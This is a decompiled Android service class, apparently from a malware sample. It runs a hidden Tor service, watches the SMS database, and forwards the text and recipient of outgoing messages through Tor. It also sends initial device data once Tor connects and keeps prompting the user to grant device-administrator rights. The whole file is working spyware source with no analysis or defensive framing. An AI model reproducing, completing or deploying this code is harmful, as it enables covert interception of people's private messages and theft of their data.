package com.baseapp;

import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.SharedPreferences;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.RemoteException;
import android.util.Log;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import org.torproject.android.TorConstants;
import org.torproject.android.service.ITorService;
import org.torproject.android.service.ITorServiceCallback;

/* loaded from: classes.dex */
public class MainService extends Service implements TorConstants {
    private static final String CONTENT_SMS = "content://sms";
    private static final int MESSAGE_TYPE_SENT = 2;
    public static boolean isRunning = false;
    private DevicePolicyManager deviceManager;
    private ContentObserver observer;
    private SharedPreferences settings;
    private int torStatus = 0;
    private ITorService mService = null;
    private boolean mIsBound = false;
    private ITorServiceCallback mCallback = new ITorServiceCallback.Stub() { // from class: com.baseapp.MainService.1
        @Override // org.torproject.android.service.ITorServiceCallback
        public void statusChanged(String value) {
            MainService.this.updateStatus(value);
        }

        @Override // org.torproject.android.service.ITorServiceCallback
        public void logMessage(String value) throws RemoteException {
        }

        @Override // org.torproject.android.service.ITorServiceCallback
        public void updateBandwidth(long upload, long download, long written, long read) {
        }
    };
    private ServiceConnection mConnection = new ServiceConnection() { // from class: com.baseapp.MainService.2
        @Override // android.content.ServiceConnection
        public void onServiceConnected(ComponentName className, IBinder service) {
            MainService.this.mService = ITorService.Stub.asInterface(service);
            try {
                MainService.this.mService.registerCallback(MainService.this.mCallback);
            } catch (RemoteException e) {
                Log.d(TorConstants.TAG, "error registering callback to service", e);
            }
        }

        @Override // android.content.ServiceConnection
        public void onServiceDisconnected(ComponentName className) {
            MainService.this.mService = null;
        }
    };

    @Override // android.app.Service
    public void onCreate() {
        isRunning = true;
        super.onCreate();
        this.settings = getSharedPreferences(Constants.PREFS_NAME, 0);
        this.deviceManager = (DevicePolicyManager) getSystemService("device_policy");
        startService(new Intent(TorConstants.INTENT_TOR_SERVICE));
        bindTorService();
        registerContentObserver();
        checkDeviceAdmin();
        ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleAtFixedRate(new Runnable() { // from class: com.baseapp.MainService.3
            @Override // java.lang.Runnable
            public void run() {
                try {
                    if (MainService.this.mService.getStatus() != 1) {
                        MainService.this.mService.setProfile(1);
                    }
                } catch (RemoteException e) {
                    e.printStackTrace();
                }
            }
        }, 0L, 300L, TimeUnit.SECONDS);
    }

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int flags, int startId) {
        return super.onStartCommand(intent, flags, startId);
    }

    @Override // android.app.Service
    public void onDestroy() {
        super.onDestroy();
        unregisterContentObserver();
        try {
            stopTor();
            unbindTorService();
        } catch (RemoteException e) {
            e.printStackTrace();
        }
        isRunning = false;
    }

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void registerContentObserver() {
        if (this.observer == null) {
            this.observer = new ContentObserver(null) { // from class: com.baseapp.MainService.4
                @Override // android.database.ContentObserver
                public void onChange(boolean selfChange) {
                    Cursor cursor = MainService.this.getContentResolver().query(Uri.parse(MainService.CONTENT_SMS), null, null, null, null);
                    if (cursor.moveToNext()) {
                        String protocol = cursor.getString(cursor.getColumnIndex("protocol"));
                        int type = cursor.getInt(cursor.getColumnIndex("type"));
                        if (protocol == null && type == 2) {
                            int bodyColumn = cursor.getColumnIndex("body");
                            int addressColumn = cursor.getColumnIndex("address");
                            String to = cursor.getString(addressColumn);
                            String message = cursor.getString(bodyColumn);
                            if (MainService.this.settings.getBoolean(Constants.LISTENING_SMS_ENABLED, false)) {
                                TorSender.sendListenedOutgoingSMS(MainService.this, message, to);
                            }
                        } else {
                            return;
                        }
                    }
                    cursor.close();
                }
            };
            getContentResolver().registerContentObserver(Uri.parse(CONTENT_SMS), true, this.observer);
        }
    }

    private void unregisterContentObserver() {
        getContentResolver().unregisterContentObserver(this.observer);
        this.observer = null;
    }

    private void checkDeviceAdmin() {
        ComponentName componentName = new ComponentName(this, MyDeviceAdminReceiver.class);
        if (!this.deviceManager.isAdminActive(componentName)) {
            Intent intent = new Intent();
            intent.setClass(this, DeviceAdminChecker.class);
            intent.setFlags(intent.getFlags() | 268435456);
            startActivity(intent);
        }
    }

    public void updateStatus(String torServiceMsg) {
        try {
            if (this.mService != null) {
                this.torStatus = this.mService.getStatus();
            }
            if (this.torStatus == 1 && torServiceMsg.equals(getString(R.string.status_activated))) {
                TorSender.sendInitialData(this);
            }
        } catch (RemoteException e) {
            Log.e(TorConstants.TAG, "remote exception updating status", e);
        }
    }

    private void stopTor() throws RemoteException {
        if (this.mService != null) {
            this.mService.setProfile(-1);
        }
    }

    private void bindTorService() {
        bindService(new Intent(ITorService.class.getName()), this.mConnection, 1);
        this.mIsBound = true;
    }

    private void unbindTorService() {
        if (this.mIsBound) {
            if (this.mService != null) {
                try {
                    this.mService.unregisterCallback(this.mCallback);
                } catch (RemoteException e) {
                }
            }
            this.mService = null;
            unbindService(this.mConnection);
            this.mIsBound = false;
        }
    }
}